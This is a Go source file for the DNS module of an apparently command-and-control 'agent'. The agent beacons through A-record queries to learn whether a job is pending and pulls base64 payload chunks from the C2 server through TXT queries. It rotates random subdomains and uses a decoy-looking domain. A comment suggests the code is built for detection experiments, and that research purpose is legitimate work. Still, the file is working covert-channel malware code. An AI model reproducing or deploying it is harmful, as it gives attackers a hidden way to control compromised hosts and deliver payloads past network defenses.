// Package dns provides DNS query functionality for the agent.
//
// IMPORTANT ROUTING LOGIC:
//
// A record queries (beacons):
//   - DirectMode=true  → Query C2 server directly (testing)
//   - DirectMode=false → Query local resolver (production/experiment)
//
// TXT record queries (payload transfer):
//   - ALWAYS query C2 server directly, regardless of DirectMode
//   - This bypasses resolver caching (we reuse subdomains)
//   - The high volume of TXT queries is the detection signal, not the path
package dns

import (
	"fmt"
	"github.com/miekg/dns"
	"motd_joker_screenmate/internal/protocol"
	"net"
	"strings"
	"time"
)

// Client handles DNS queries for the agent.
type Client struct {
	aTarget   string // Target for A queries (resolver or C2)
	txtTarget string // Target for TXT queries (always C2 direct)
	domain    string // Base domain (e.g., "timeserversync.com")
	timeout   time.Duration
}

// NewClient creates a new DNS client.
//
// Parameters:
//   - aTarget: Where to send A queries (resolver IP:port or C2 IP:port)
//   - txtTarget: Where to send TXT queries (always C2 IP:port)
//   - domain: Base domain for queries
//
// For testing (DirectMode=true):
//
//	aTarget = "C2_IP:53", txtTarget = "C2_IP:53"
//
// For production (DirectMode=false):
//
//	aTarget = "RESOLVER_IP:53", txtTarget = "C2_IP:53"
func NewClient(aTarget, txtTarget, domain string) *Client {
	// Ensure domain ends with a dot for FQDN
	if !strings.HasSuffix(domain, ".") {
		domain = domain + "."
	}

	return &Client{
		aTarget:   aTarget,
		txtTarget: txtTarget,
		domain:    domain,
		timeout:   5 * time.Second,
	}
}

// QueryA sends an A record query and returns the response IP.
// The subdomain is randomly selected from the rotation list.
// Uses aTarget (resolver or C2 depending on DirectMode).
//
// Returns:
//   - ip: The IP address from the response
//   - isJob: True if IP is in the JOB range, false if NO JOB range
//   - err: Any error that occurred
func (c *Client) QueryA() (net.IP, bool, error) {
	// Select random subdomain to avoid caching
	subdomain := protocol.RandomSubdomain()
	fqdn := subdomain + "." + c.domain

	// Create DNS message
	msg := new(dns.Msg)
	msg.SetQuestion(fqdn, dns.TypeA)
	msg.RecursionDesired = true // Ask resolver to do recursive lookup

	// Create client with timeout
	client := &dns.Client{
		Timeout: c.timeout,
		Net:     "udp",
	}

	// Send query to A target (resolver or C2)
	response, _, err := client.Exchange(msg, c.aTarget)
	if err != nil {
		return nil, false, fmt.Errorf("DNS A query failed: %w", err)
	}

	// Check for valid response
	if response == nil || len(response.Answer) == 0 {
		return nil, false, fmt.Errorf("no answer in DNS response")
	}

	// Extract IP from first A record
	for _, answer := range response.Answer {
		if a, ok := answer.(*dns.A); ok {
			ip := a.A
			isJob := protocol.IsJobIP(ip)
			return ip, isJob, nil
		}
	}

	return nil, false, fmt.Errorf("no A record in response")
}

// QueryTXT sends a TXT record query and returns the response text.
// ALWAYS queries C2 directly (bypasses resolver caching).
// Uses txtTarget regardless of DirectMode setting.
//
// Returns:
//   - txt: The TXT record value (contains sequence + base64 data)
//   - isEmpty: True if empty TXT (signals end of transfer)
//   - err: Any error that occurred
func (c *Client) QueryTXT() (string, bool, error) {
	// Select random subdomain (still rotate for appearance)
	subdomain := protocol.RandomSubdomain()
	fqdn := subdomain + "." + c.domain

	// Create DNS message
	msg := new(dns.Msg)
	msg.SetQuestion(fqdn, dns.TypeTXT)
	msg.RecursionDesired = false // Direct query, no recursion needed

	// Create client
	client := &dns.Client{
		Timeout: c.timeout,
		Net:     "udp",
	}

	// Send query directly to C2 (txtTarget), bypassing resolver
	response, _, err := client.Exchange(msg, c.txtTarget)
	if err != nil {
		return "", false, fmt.Errorf("DNS TXT query failed: %w", err)
	}

	// Check for valid response
	if response == nil || len(response.Answer) == 0 {
		return "", false, fmt.Errorf("no answer in DNS TXT response")
	}

	// Extract TXT value
	for _, answer := range response.Answer {
		if txt, ok := answer.(*dns.TXT); ok {
			// TXT records can have multiple strings, we use the first
			if len(txt.Txt) == 0 || txt.Txt[0] == "" {
				return "", true, nil // Empty = end of transfer
			}
			return txt.Txt[0], false, nil
		}
	}

	return "", false, fmt.Errorf("no TXT record in response")
}

// Beacon performs a single A record check-in.
// This is a convenience wrapper.
//
// Returns true if a job is pending, false otherwise.
func (c *Client) Beacon() (bool, error) {
	ip, isJob, err := c.QueryA()
	if err != nil {
		return false, err
	}

	if isJob {
		return true, nil
	}

	_ = ip // Could log for debugging
	return false, nil
}
